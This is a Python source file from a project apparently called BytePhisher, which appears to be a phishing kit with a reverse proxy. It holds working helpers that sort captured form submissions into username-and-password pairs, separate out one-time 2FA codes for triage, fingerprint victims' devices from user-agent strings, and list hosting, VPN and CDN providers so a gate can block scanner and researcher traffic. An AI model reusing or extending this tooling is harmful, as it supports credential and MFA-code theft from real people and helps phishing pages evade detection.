# BytePhisher — shared classification helpers.
#
# These three things were implemented twice (server.py and proxy.py) with
# slightly different rules, so a visitor could be classified as a credential
# pair on one path and not the other. One module, one behaviour:
#
#   is_credential_pair(fields)  — did this submission contain an identity + a secret?
#   classify_device(ua)         — ios / android / windows / macos / linux / unknown
#   is_datacenter(isp)          — hosting/cloud network (shared with core/gate.py)
#
# All three are deliberately conservative: a false "credential" inflates a
# report, a false "datacenter" blocks a real visitor.
import re

# ------------------------------------------------------------- credentials --
ID_EXACT = {
    "username", "email", "login", "user", "user_name", "email_address", "user_id",
    "username_or_email", "email_or_username", "userid", "login_id", "account",
    "account_name", "account_id", "customer_id", "employee_id", "phone", "mobile",
    "phone_number", "msisdn", "identifier", "name", "fullname",
}
PW_EXACT = {
    "password", "passw", "pwd", "password_confirm", "passwd", "pass_code", "pass",
    "passphrase", "password_confirmation", "pwd_confirm", "secret", "pin",
    "pin_code", "mpin", "passcode", "current_password", "new_password",
}
ID_TOKENS = ("user", "login", "email", "mail", "account", "identifier", "phone",
             "mobile", "customer", "employee")
PW_TOKENS = ("pass", "pwd", "pin", "secret")


def _has_token(keys, tokens):
    """Token match on word boundaries.

    A plain `in` test made 'shipping' match the token 'pin' and turned a benign
    address form into a "credential pair". Boundaries fix that while still
    catching real-world names: passwd, user_pin, login-password, myPinCode.
    """
    for k in keys:
        for t in tokens:
            if re.search(rf"(^|[^a-z0-9]){t}([^a-z0-9]|$)", k):
                return True
            # camelCase / concatenated forms: myPinCode, loginPassword
            if re.search(rf"{t}(?=[A-Z0-9])", k) or k.startswith(t) or k.endswith(t):
                return True
    return False


def is_credential_pair(fields):
    """True when a submission carries an identity field AND a secret field."""
    keys = [str(k).lower() for k in (fields or {})]
    if not keys:
        return False
    if (ID_EXACT & set(keys)) and (PW_EXACT & set(keys)):
        return True
    # a filled password field plus any identity-looking field is enough
    return _has_token(keys, ID_TOKENS) and _has_token(keys, PW_TOKENS)


def has_secret(fields):
    """True when a secret-shaped field is present at all (used for OTP triage)."""
    keys = [str(k).lower() for k in (fields or {})]
    return bool(PW_EXACT & set(keys)) or _has_token(keys, PW_TOKENS)


OTP_RE = re.compile(r"(otp|2fa|mfa|totp|verif|code|token|auth_?code|sms_?code)", re.I)


def looks_like_otp(fields):
    """A one-time-code submission: code-shaped field names and no password."""
    keys = [str(k).lower() for k in (fields or {})]
    if not keys:
        return False
    if _has_token(keys, ("pass", "pwd")):
        return False
    return any(OTP_RE.search(k) for k in keys)


# ----------------------------------------------------------------- device ---
def classify_device(ua):
    """Coarse device class from the user-agent string."""
    ual = (ua or "").lower()
    if "iphone" in ual or "ipod" in ual:
        return "ios"
    if "ipad" in ual:
        return "ios"
    if "android" in ual:
        return "android"
    if "windows" in ual:
        return "windows"
    if "mac os" in ual or "macintosh" in ual:
        return "macos"
    if "cros" in ual:
        return "chromeos"
    if "linux" in ual or "x11" in ual:
        return "linux"
    return "unknown"


# ------------------------------------------------------------ datacenter ----
# Hosting/cloud/VPS markers. Kept in one place so core/risk.py (scoring) and
# core/gate.py (refusal) can never disagree about the same ISP.
DATACENTER_MARKERS = (
    "ovh", "hetzner", "digitalocean", "linode", "vultr", "amazon", "aws",
    "google cloud", "gcp", "microsoft azure", "azure", "oracle cloud", "alibaba",
    "tencent", "contabo", "scaleway", "leaseweb", "choopa", "serverius",
    "hostwinds", "hostinger", "namecheap", "godaddy", "colocation", "colo",
    "datacamp", "datacenter", "data center", "hosting", "vps", "vpn", "proxy",
    "cloud", "server", "dedicated", "bare metal", "m247", "psychz", "quadranet",
    "frantech", "buyvm", "racknerd", "interserver", "ionos", "1&1", "strato",
    "netcup", "gcore", "fastly", "cloudflare", "akamai", "cdn77", "stackpath",
)


def is_datacenter(isp):
    """True when the ISP/org string looks like hosting rather than an eyeball ISP."""
    low = (isp or "").lower()
    return any(m in low for m in DATACENTER_MARKERS)
